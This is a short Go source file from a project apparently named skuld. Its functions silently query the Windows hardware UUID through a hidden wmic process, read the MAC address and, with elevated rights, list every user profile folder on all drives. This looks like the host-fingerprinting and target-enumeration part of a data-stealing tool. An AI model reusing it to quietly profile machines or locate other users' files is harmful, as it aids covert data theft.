package hardware

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/hackirby/skuld/utils/program"
	"github.com/shirou/gopsutil/v3/disk"
)

func GetHWID() (string, error) {
	cmd := exec.Command("wmic", "csproduct", "get", "UUID")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := cmd.Output()
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(strings.Split(string(out), "\n")[1]), nil
}

func GetMAC() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	for _, i := range interfaces {
		if i.Flags&net.FlagUp != 0 && !bytes.Equal(i.HardwareAddr, nil) {
			return i.HardwareAddr.String(), nil
		}
	}

	return "", fmt.Errorf("no MAC address found")
}

func GetUsers() []string {
	if !program.IsElevated() {
		return []string{os.Getenv("USERPROFILE")}
	}

	var users []string
	drives, err := disk.Partitions(false)
	if err != nil {
		return []string{os.Getenv("USERPROFILE")}
	}

	for _, drive := range drives {
		mountpoint := drive.Mountpoint

		files, err := os.ReadDir(fmt.Sprintf("%s//Users", mountpoint))
		if err != nil {
			continue
		}

		for _, file := range files {
			if !file.IsDir() {
				continue
			}
			users = append(users, filepath.Join(fmt.Sprintf("%s//Users", mountpoint), file.Name()))
		}
	}

	return users
}
